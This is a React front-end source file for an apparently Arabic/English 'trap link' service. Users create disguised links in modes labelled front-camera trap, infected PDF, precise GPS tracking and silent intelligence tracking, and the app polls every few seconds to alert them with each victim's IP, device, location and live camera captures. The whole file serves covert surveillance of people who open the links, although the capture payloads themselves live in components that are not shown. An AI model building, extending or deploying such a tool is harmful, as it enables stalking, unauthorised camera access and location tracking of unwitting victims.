import React, { useState, useEffect, useCallback } from 'react';
import { Navbar, MainNavView } from './components/Navbar';
import { Footer } from './components/Footer';
import { HomeView } from './components/HomeView';
import { TrackDashboard } from './components/TrackDashboard';
import { IpLookupView } from './components/IpLookupView';
import { MacLookupView } from './components/MacLookupView';
import { ExifToolView } from './components/ExifToolView';
import { CyberAwarenessView } from './components/CyberAwarenessView';
import { SupportView } from './components/SupportView';
import { RobotCaptchaModal } from './components/RobotCaptchaModal';
import { SectionTrapModal } from './components/SectionTrapModal';
import { VisitDetailModal } from './components/VisitDetailModal';
import { LiveDeviceAlertToast } from './components/LiveDeviceAlertToast';
import { playAlertChime } from './utils/audioAlert';
import { Language, translations } from './translations';
import { TrackingLink, TrackingMode, VisitRecord } from './types';
import { X, Clock, ExternalLink, Trash2, Globe } from 'lucide-react';

const USER_TOKEN_KEY = 'ipsm_user_token';
const SAVED_LINKS_KEY = 'ipsm_saved_links';
const LANG_KEY = 'ipsm_lang';

function checkIsRobotVerified(): boolean {
  try {
    const verifiedTimeStr = localStorage.getItem('sm_robot_verified_time');
    const isCookie = document.cookie.includes('sm_robot_verified=true');
    
    if (verifiedTimeStr) {
      const verifiedTime = parseInt(verifiedTimeStr, 10);
      // Fallback: in sandboxed iframe previews, cookies can be disabled/blocked. 
      // Relying on localStorage timestamp (under 4 hours / 14400000ms) guarantees robust persistence.
      if (!isNaN(verifiedTime) && (Date.now() - verifiedTime < 14400000)) {
        return true;
      }
    }
    return false;
  } catch {
    return false;
  }
}

function getOrSetUserToken(): string {
  let token = localStorage.getItem(USER_TOKEN_KEY);
  if (!token) {
    const cookieMatch = document.cookie.match(/(?:^|; )ipsm_user_token=([^;]*)/);
    if (cookieMatch && cookieMatch[1]) {
      token = decodeURIComponent(cookieMatch[1]);
    }
  }
  if (!token) {
    token =
      'usr_' +
      Math.random().toString(36).substring(2, 15) +
      Math.random().toString(36).substring(2, 15);
  }
  try {
    localStorage.setItem(USER_TOKEN_KEY, token);
    document.cookie = `ipsm_user_token=${encodeURIComponent(token)}; path=/; max-age=315360000; SameSite=Lax`;
  } catch (e) {
    console.warn('Cookie storage error:', e);
  }
  return token;
}

export default function App() {
  const [lang, setLang] = useState<Language>(() => {
    const saved = localStorage.getItem(LANG_KEY);
    return saved === 'en' ? 'en' : 'ar';
  });

  const [activeView, setActiveView] = useState<MainNavView>('home');
  const [activeCode, setActiveCode] = useState<string | null>(null);
  const [currentLink, setCurrentLink] = useState<TrackingLink | null>(null);
  const [visits, setVisits] = useState<VisitRecord[]>([]);
  const [savedLinks, setSavedLinks] = useState<TrackingLink[]>(() => {
    try {
      const saved = localStorage.getItem(SAVED_LINKS_KEY);
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  const [isCreating, setIsCreating] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [showSavedModal, setShowSavedModal] = useState(false);
  const [showCaptcha, setShowCaptcha] = useState(() => !checkIsRobotVerified());
  const [isTrapModalOpen, setIsTrapModalOpen] = useState(false);
  const [trapModalMode, setTrapModalMode] = useState<TrackingMode>('camera');
  const [pendingView, setPendingView] = useState<MainNavView | null>(null);

  const [globalVisits, setGlobalVisits] = useState(800);
  const [globalLinks, setGlobalLinks] = useState(1500);

  const [notificationPermission, setNotificationPermission] = useState<'default' | 'granted' | 'denied'>(() => {
    if (typeof window !== 'undefined' && 'Notification' in window) {
      return Notification.permission;
    }
    return 'default';
  });
  const [knownVisitIds, setKnownVisitIds] = useState<Set<string>>(new Set());
  const [alertVisitsQueue, setAlertVisitsQueue] = useState<VisitRecord[]>([]);
  const [selectedGlobalVisit, setSelectedGlobalVisit] = useState<VisitRecord | null>(null);

  const persistLinks = (links: TrackingLink[]) => {
    setSavedLinks(links);
    try {
      localStorage.setItem(SAVED_LINKS_KEY, JSON.stringify(links));
    } catch (e) {
      console.error(e);
    }
  };

  const fetchLinkData = useCallback(async (code: string) => {
    setIsRefreshing(true);
    try {
      const res = await fetch(`/api/links/${code}`, {
        headers: { 'x-sm-auth': 'active' }
      });
      const contentType = res.headers.get('content-type');
      if (res.ok && contentType && contentType.includes('application/json')) {
        const data = await res.json();
        if (data && data.success) {
          setCurrentLink(data.link);
          setVisits(data.visits || []);

          setSavedLinks((prev) => {
            const next = prev.map((l) =>
              l.code === code ? { ...l, visitCount: data.visits?.length || 0 } : l
            );
            persistLinks(next);
            return next;
          });
          return;
        }
      }
      setActiveCode(null);
      setCurrentLink(null);
      setActiveView('home');
    } catch (err) {
    } finally {
      setIsRefreshing(false);
    }
  }, []);

  // Request notification permission
  const handleRequestNotificationPermission = async () => {
    if (typeof window !== 'undefined' && 'Notification' in window) {
      const result = await Notification.requestPermission();
      setNotificationPermission(result);
      if (result === 'granted') {
        new Notification(lang === 'ar' ? 'تم تفعيل الإشعارات بنجاح' : 'Notifications enabled successfully', {
          body: lang === 'ar' ? 'ستتلقى تنبيهاً فورياً عند دخول أي جهاز جديد لأي رابط أو ملف.' : 'You will receive an instant notification when a new device accesses any link or file.',
          icon: '/favicon.png'
        });
      }
    }
  };

  // Dismiss toast handler
  const handleDismissAlert = (visitId: string) => {
    setAlertVisitsQueue((prev) => prev.filter((v) => v.id !== visitId));
  };

  // Open details from notification
  const handleViewAlertDetails = (visit: VisitRecord) => {
    handleDismissAlert(visit.id);
    if (visit.code) {
      setActiveCode(visit.code);
      setActiveView('track');
      window.history.pushState({}, '', `?code=${visit.code}`);
      fetchLinkData(visit.code);
    }
    setSelectedGlobalVisit(visit);
  };

  // Auto-dismiss the oldest toast notification after 12 seconds
  useEffect(() => {
    if (alertVisitsQueue.length === 0) return;
    const timer = setTimeout(() => {
      setAlertVisitsQueue((prev) => prev.slice(1));
    }, 12000);
    return () => clearTimeout(timer);
  }, [alertVisitsQueue]);

  // Universal real-time polling across ALL links, files, and sections for immediate notifications
  useEffect(() => {
    let active = true;
    const token = getOrSetUserToken();

    const pollAllVisits = async () => {
      try {
        const res = await fetch(`/api/user-visits?token=${encodeURIComponent(token)}`, {
          headers: { 'x-user-token': token, 'x-sm-auth': 'active' }
        });
        if (!res.ok) return;
        const data = await res.json();
        if (data && data.success && Array.isArray(data.visits) && active) {
          const incomingVisits: VisitRecord[] = data.visits;

          setKnownVisitIds((prevKnown) => {
            // First time initialization: populate known set without ringing bells for past history
            if (prevKnown.size === 0) {
              return new Set(incomingVisits.map((v) => v.id));
            }

            const brandNewVisits = incomingVisits.filter((v) => !prevKnown.has(v.id));
            if (brandNewVisits.length > 0) {
              // 1. Play alert sound
              playAlertChime();

              // 2. Dispatch native browser notification
              if (typeof window !== 'undefined' && 'Notification' in window && Notification.permission === 'granted') {
                brandNewVisits.forEach((v) => {
                  const linkRef = savedLinks.find(l => l.code === v.code);
                  const linkName = linkRef?.name ? `(${linkRef.name})` : '';
                  
                  const sectionLabel = v.mode === 'camera'
                    ? (lang === 'ar' ? 'قسم فخ الكاميرا الأمامية فقط' : 'Front-Only Camera Trap')
                    : v.mode === 'pdf'
                    ? (lang === 'ar' ? 'قسم ملف الـ PDF المفخخ' : 'Infected PDF File')
                    : v.mode === 'precise'
                    ? (lang === 'ar' ? 'قسم تتبع GPS الدقيق' : 'Precise GPS Tracking')
                    : (lang === 'ar' ? 'قسم التتبع الاستخباري الصامت' : 'Silent Intelligence Tracking');

                  new Notification(
                    lang === 'ar' ? `رصد دخول جديد: ${sectionLabel} ${linkName}` : `New Entry Detected: ${sectionLabel} ${linkName}`,
                    {
                      body: `${v.device || 'Device'} (${v.os || 'OS'}) - IP: ${v.ip}\n${[v.city, v.country].filter(Boolean).join(', ')}`,
                      icon: '/favicon.png',
                      tag: v.id,
                      requireInteraction: true
                    }
                  );
                });
              }

              // 3. Push to interactive in-app toast queue
              setAlertVisitsQueue((prev) => {
                const map = new Map(prev.map((item) => [item.id, item]));
                brandNewVisits.forEach((item) => map.set(item.id, item));
                return Array.from(map.values()).slice(-4);
              });

              // 4. If current track dashboard is open and matches one of the new visits, refresh visits list
              if (activeCode) {
                const matchesActiveCode = brandNewVisits.some((v) => v.code === activeCode);
                if (matchesActiveCode) {
                  fetchLinkData(activeCode);
                }
              }

              // 5. Update savedLinks visit counts
              setSavedLinks((prev) => {
                const countMap = new Map<string, number>();
                incomingVisits.forEach((v) => {
                  countMap.set(v.code, (countMap.get(v.code) || 0) + 1);
                });
                return prev.map((l) => ({
                  ...l,
                  visitCount: Math.max(l.visitCount || 0, countMap.get(l.code) || 0)
                }));
              });

              const updatedSet = new Set(prevKnown);
              brandNewVisits.forEach((v) => updatedSet.add(v.id));
              return updatedSet;
            }

            return prevKnown;
          });
        }
      } catch (err) {
        // Polling error non-blocking
      }
    };

    // Initial poll
    pollAllVisits();
    // Periodic poll every 2000ms
    const interval = setInterval(pollAllVisits, 2000);
    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [activeCode, lang, fetchLinkData]);

  useEffect(() => {
    document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
    document.documentElement.lang = lang;
    localStorage.setItem(LANG_KEY, lang);
    document.documentElement.classList.remove('dark');
  }, [lang]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const codeParam = params.get('code');
    const tabParam = params.get('tab');

    if (codeParam) {
      setActiveCode(codeParam);
      setActiveView('track');
    } else if (tabParam === 'ip-lookup' || tabParam === 'support') {
      setActiveView(tabParam);
    }
  }, []);

  useEffect(() => {
    const token = getOrSetUserToken();
    fetch(`/api/user-links?token=${encodeURIComponent(token)}`, {
      headers: {
        'x-user-token': token,
        'x-sm-auth': 'active'
      },
    })
      .then(async (res) => {
        const contentType = res.headers.get('content-type');
        if (res.ok && contentType && contentType.includes('application/json')) {
          return res.json();
        }
        return { success: false };
      })
      .then((data) => {
        if (data && data.success) {
          if (data.globalVisits != null) setGlobalVisits(data.globalVisits);
          if (data.globalLinks != null) setGlobalLinks(data.globalLinks);
          
          if (Array.isArray(data.links)) {
            setSavedLinks((prev) => {
              const map = new Map<string, TrackingLink>();
              data.links.forEach((l: TrackingLink) => map.set(l.code, l));
              prev.forEach((l: TrackingLink) => {
                if (!map.has(l.code)) map.set(l.code, l);
              });
              const merged = Array.from(map.values()).sort(
                (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
              );
              persistLinks(merged);
              return merged;
            });
          }
        }
      })
      .catch((err) => console.warn('Sync user links notice:', err));
  }, []);

  useEffect(() => {
    if (activeCode) {
      fetchLinkData(activeCode);
      // Ultra-fast polling (800ms in camera mode, 1.5s general) to keep live camera captures and visits in sync
      const pollRate = currentLink?.mode === 'camera' ? 800 : 1500;
      const interval = setInterval(() => {
        fetchLinkData(activeCode);
      }, pollRate);
      return () => clearInterval(interval);
    } else {
      setCurrentLink(null);
      setVisits([]);
    }
  }, [activeCode, currentLink?.mode, fetchLinkData]);

  const handleToggleLang = () => {
    setLang((prev) => (prev === 'ar' ? 'en' : 'ar'));
  };

  const handleCreateLink = async (originalUrl: string, mode: TrackingMode) => {
    if (!checkIsRobotVerified()) {
      setShowCaptcha(true);
      return;
    }

    setIsCreating(true);
    try {
      const userToken = getOrSetUserToken();
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-sm-auth': 'active'
        },
        body: JSON.stringify({ originalUrl, mode, userToken }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || data.error || 'Failed to generate tracking link');
      }

      if (data.success && data.link) {
        const newLink: TrackingLink = data.link;
        const updated = [newLink, ...savedLinks.filter((l) => l.code !== newLink.code)];
        persistLinks(updated);
        setActiveCode(newLink.code);
        setActiveView('track');
        window.history.pushState({}, '', `?code=${newLink.code}`);
      }
    } finally {
      setIsCreating(false);
    }
  };

  const handleDeleteLink = async (code: string) => {
    try {
      await fetch(`/api/links/${code}`, {
        method: 'DELETE',
        headers: { 'x-sm-auth': 'active' }
      });
    } catch (err) {
    } finally {
      const updated = savedLinks.filter((l) => l.code !== code);
      persistLinks(updated);
      setActiveCode(null);
      setCurrentLink(null);
      setVisits([]);
      setActiveView('home');
      window.history.pushState({}, '', window.location.pathname);
    }
  };

  const handleSelectLink = (code: string) => {
    if (!checkIsRobotVerified()) {
      setShowCaptcha(true);
      return;
    }
    setActiveCode(code);
    setActiveView('track');
    window.history.pushState({}, '', `?code=${code}`);
    setShowSavedModal(false);
  };

  const handleGoHome = () => {
    setActiveCode(null);
    setCurrentLink(null);
    setVisits([]);
    setActiveView('home');
    window.history.pushState({}, '', window.location.pathname);
  };

  const handleChangeView = (view: MainNavView) => {
    if (!checkIsRobotVerified()) {
      setPendingView(view);
      setShowCaptcha(true);
      return;
    }

    executeChangeView(view);
  };

  const executeChangeView = (view: MainNavView) => {
    setActiveView(view);
    if (view !== 'track') {
      setActiveCode(null);
      setCurrentLink(null);
      setVisits([]);
      const url = view === 'home' ? window.location.pathname : `?tab=${view}`;
      window.history.pushState({}, '', url);
    }
  };

  const handleCaptchaSuccess = () => {
    setShowCaptcha(false);
    if (pendingView) {
      executeChangeView(pendingView);
      setPendingView(null);
    }
  };

  const t = translations[lang];

  return (
    <div className="min-h-screen flex flex-col bg-white text-slate-900 font-sans selection:bg-indigo-600 selection:text-white">
      <Navbar
        lang={lang}
        onToggleLang={handleToggleLang}
        onGoHome={handleGoHome}
        activeView={activeCode ? 'track' : activeView}
        onChangeView={handleChangeView}
        onOpenTrapModal={(mode) => {
          setTrapModalMode(mode);
          setIsTrapModalOpen(true);
        }}
        savedCount={savedLinks.length}
        onOpenSaved={() => setShowSavedModal(true)}
      />

      <main className="flex-1 flex flex-col items-center w-full max-w-7xl mx-auto px-2 sm:px-4">
        {activeCode && currentLink ? (
          <TrackDashboard
            link={currentLink}
            visits={visits}
            lang={lang}
            onRefresh={() => fetchLinkData(activeCode)}
            isRefreshing={isRefreshing}
            onDelete={handleDeleteLink}
            onGoHome={handleGoHome}
            notificationPermission={notificationPermission}
            onRequestNotificationPermission={handleRequestNotificationPermission}
          />
        ) : activeView === 'ip-lookup' ? (
          <IpLookupView lang={lang} onBack={handleGoHome} />
        ) : activeView === 'mac-lookup' ? (
          <MacLookupView lang={lang} onBack={handleGoHome} />
        ) : activeView === 'exif-tool' ? (
          <ExifToolView lang={lang} onBack={handleGoHome} />
        ) : activeView === 'cyber-awareness' ? (
          <CyberAwarenessView lang={lang} onBack={handleGoHome} />
        ) : activeView === 'support' ? (
          <SupportView lang={lang} onBack={handleGoHome} />
        ) : (
          <HomeView
            lang={lang}
            onCreateLink={handleCreateLink}
            isCreating={isCreating}
            savedLinks={savedLinks}
            onSelectLink={handleSelectLink}
            onViewChange={handleChangeView}
            onNavigateIpLookup={() => handleChangeView('ip-lookup')}
            onOpenTrapModal={(mode) => {
              setTrapModalMode(mode);
              setIsTrapModalOpen(true);
            }}
            globalVisits={globalVisits}
            globalLinks={globalLinks}
          />
        )}
      </main>

      <RobotCaptchaModal
        isOpen={showCaptcha}
        lang={lang}
        onVerifySuccess={handleCaptchaSuccess}
      />

      <SectionTrapModal
        isOpen={isTrapModalOpen}
        onClose={() => setIsTrapModalOpen(false)}
        initialMode={trapModalMode}
        lang={lang}
        onCreateLink={handleCreateLink}
        isCreating={isCreating}
      />

      {showSavedModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-slate-950/60 backdrop-blur-xs animate-in fade-in">
          <div className="bg-white/95 backdrop-blur-md rounded-2xl border border-slate-200 shadow-2xl p-4 sm:p-5 max-w-md w-full flex flex-col gap-3 max-h-[80vh] overflow-hidden">
            <div className="flex items-center justify-between pb-2.5 border-b border-slate-100">
              <div className="flex items-center gap-1.5">
                <Clock className="w-4 h-4 text-indigo-600" />
                <h3 className="text-xs sm:text-sm font-black text-slate-950">
                  {t.recentLinksTitle}
                </h3>
              </div>
              <button
                onClick={() => setShowSavedModal(false)}
                className="p-1 rounded-lg text-slate-400 hover:text-slate-950 hover:bg-slate-100 cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="overflow-y-auto flex flex-col gap-2 max-h-96 pe-1">
              {savedLinks.length === 0 ? (
                <p className="text-xs text-slate-500 text-center py-6">
                  {t.noRecentLinks}
                </p>
              ) : (
                savedLinks.map((link) => (
                  <div
                    key={link.code}
                    className="p-2.5 rounded-xl border border-slate-200 bg-slate-50 hover:bg-indigo-50/50 flex items-center justify-between gap-2.5 transition-colors shadow-2xs"
                  >
                    <div
                      onClick={() => handleSelectLink(link.code)}
                      className="flex flex-col gap-0.5 flex-1 cursor-pointer min-w-0"
                    >
                      <div className="flex items-center gap-1.5">
                        <span className="font-mono font-bold text-xs text-slate-950">
                          /{link.code}
                        </span>
                        <span
                          className={`text-[9px] font-bold px-1.5 py-0.2 rounded-full ${
                            link.mode === 'precise'
                              ? 'bg-indigo-100 text-indigo-800'
                              : link.mode === 'pdf'
                              ? 'bg-amber-100 text-amber-800'
                              : link.mode === 'camera'
                              ? 'bg-rose-100 text-rose-800'
                              : 'bg-slate-200 text-slate-700'
                          }`}
                        >
                          {link.mode === 'precise' ? t.preciseTrackingBadge : (link.mode === 'pdf' ? t.pdfTrackingBadge : (link.mode === 'camera' ? t.cameraTrackingBadge : t.nearTrackingBadge))}
                        </span>
                      </div>
                      <span className="text-[11px] text-slate-500 truncate">
                        {link.originalUrl}
                      </span>
                    </div>

                    <button
                      onClick={() => handleDeleteLink(link.code)}
                      className="p-1.5 rounded-lg text-slate-400 hover:text-red-600 hover:bg-red-50 transition-colors shrink-0 cursor-pointer"
                      title={t.deleteLink}
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* Global Real-time Device Alert Toast across all sections & links */}
      <LiveDeviceAlertToast
        visits={alertVisitsQueue}
        lang={lang}
        onDismiss={handleDismissAlert}
        onViewDetails={handleViewAlertDetails}
      />

      {/* Global Visit Detail Modal opened directly from alert toast */}
      {selectedGlobalVisit && (
        <VisitDetailModal
          isOpen={true}
          onClose={() => setSelectedGlobalVisit(null)}
          visit={selectedGlobalVisit}
          lang={lang}
        />
      )}

      <Footer lang={lang} />
    </div>
  );
}
